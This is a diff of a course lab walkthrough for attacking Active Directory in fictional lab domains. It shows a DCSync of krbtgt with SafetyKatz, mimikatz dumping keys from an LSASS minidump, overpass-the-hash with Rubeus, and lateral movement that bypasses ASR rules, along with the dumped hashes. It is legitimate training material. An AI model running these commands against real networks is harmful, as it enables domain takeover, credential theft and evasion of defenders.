@@ -4578,11 +4578,16 @@ set computername
 COMPUTERNAME=MCORP-DC
 ```
 
-We can also execute the DCSync attacks against moneycorp. Use the following command in the above 
-prompt where we injected the ticket
+We can also execute the DCSync attacks against moneycorp. 
+Use the following command in the above prompt where we injected the ticket
 
 * C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
-
+```
+Credentials:
+Hash NTLM: a0981492d5dfab1ae0b97b51ea895ddf
+ntlm- 0: a0981492d5dfab1ae0b97b51ea895ddf
+lm - 0: 87836055143ad5a507de2aaeb9000361
+```
 
 ## Learning Objective 20:
 ```
@@ -6828,7 +6833,6 @@ Perform another benign query for safe measure to break any detection chain
 
 * PS C:\AD\Tools> Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'SELECT * FROM master.dbo.sysdatabases' -QueryTarget eu-sql37
 
-
 Back on our studentvm we can now begin to parse the exfiltrated LSASS minidump (monkey.dmp) using 
 mimikatz as follows. Run the below command from an elevated shell (Run as administrator):
 NOTE: If you encounter errors parsing the minidump file, most likely your student VM memory is full. 
@@ -6836,3 +6840,82 @@ Attempt a quick fix by logging in and out of the student VM. Also, turn off Wind
 student VM.
 
 * C:\Windows\System32> C:\AD\Tools\mimikatz.exe "sekurlsa::minidump C:\AD\Tools\studentsharex\monkey.dmp" "sekurlsa::ekeys" "exit"
+```
+ .#####. mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
+.## ^ ##. "A La Vie, A L'Amour" - (oe.eo)
+## / \ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+## \ / ## > https://blog.gentilkiwi.com/mimikatz
+'## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com )
+ '#####' > https://pingcastle.com / https://mysmartlogon.com ***/
+[....snip....]
+Authentication Id : 0 ; 225670 (00000000:00037186)
+Session : RemoteInteractive from 2
+User Name : dbadmin
+Domain : EU
+Logon Server : EU-DC
+Logon Time : 10/27/2023 5:51:45 AM
+SID : S-1-5-21-3665721161-1121904292-1901483061-1105
+ * Username : dbadmin
+ * Domain : EU.EUROCORP.LOCAL
+ * Password : (null)
+ * Key List :
+ aes256_hmac 
+ef21ff273f16d437948ca755d010d5a1571a5bda62a0a372b29c703ab0777d4f
+AlteredSecurity Attacking and Defending Active Directory 120
+ rc4_hmac_nt 0553b02b95f64f7a3c27b9029d105c27
+ rc4_hmac_old 0553b02b95f64f7a3c27b9029d105c27
+ rc4_md4 0553b02b95f64f7a3c27b9029d105c27
+ rc4_hmac_nt_exp 0553b02b95f64f7a3c27b9029d105c27
+ rc4_hmac_old_exp 0553b02b95f64f7a3c27b9029d105c27
+```
+
+Now, use Overpass-the-hash on the student VM using Rubeus to start a process with privileges of the dbadmin user who is a member of eu.eurocorp.local. 
+Run the below command from a high integrity process on student VM (Run as administrator)
+
+* C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:dbadmin /aes256:ef21ff273f16d437948ca755d010d5a1571a5bda62a0a372b29c703ab0777d4f /domain:eu.eurocorp.local /dc:eu-dc.eu.eurocorp.local /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+[+] Ticket successfully imported!
+ ServiceName : krbtgt/EU.EUROCORP.LOCAL
+ ServiceRealm : EU.EUROCORP.LOCAL
+ UserName : dbadmin
+ UserRealm : EU.EUROCORP.LOCAL
+```
+
+### Lateral Movement – ASR Rules Bypass
+We can now use winrs to access eu-sqlx. Runthe below commands from the process spawned as dbadmin
+
+* C:\Windows\system32>winrs -r:eu-sqlx.eu.eurocorp.local cmd
+```
+Microsoft Windows [Version 10.0.20348.1249]
+(c) Microsoft Corporation. All rights reserved.
+```
+
+* C:\Users\dbadmin>set username
+```
+set username
+USERNAME=dbadmin
+```
+
+Note that use of winrs is not detected by MDE but MDI (Microsoft Defender for Identity) detects it. 
+To avoid detection, we can use the WSManWinRM.exe tool. We will append an ASR exclusion such as "C:\Windows\ccmcache\" to avoid detections from the "Block process creations originating from PSExec 
+and WMI commands" ASR rule. Run the below command from the process spawned as dbadmin:
+NOTE: If the tool returns a value of 0, there is an error with command execution
+
+* C:\Windows\system32>C:\AD\Tools\WSManWinRM.exe eu-sqlx.eu.eurocorp.local "cmd /c set username C:\Windows\ccmcache\"
+```
+[*] Creating session with the remote system...
+[*] Connected to the remote WinRM system
+[*] Result Code: 000001C1F2FD2AC8
+C:\Windows\system32>
+```
+
+To see the command output, we can redirect the command to share on the student VM. This has very 
+limited success and we are continuously trying ways to make it more effective.
+
+* C:\Windows\system32>C:\AD\Tools\WSManWinRM.exe eu-sqlx.eu.eurocorp.local "cmd /c dir >> \\dcorp-studentx.dollarcorp.moneycorp.local\studentsharex\out.txt C:\Windows\ccmcache\"
+```
+[*] Creating session with the remote system...
+[*] Connected to the remote WinRM system
+[*] Result Code: 000001C1F2FD2AC8
+C:\Windows\system32
+```
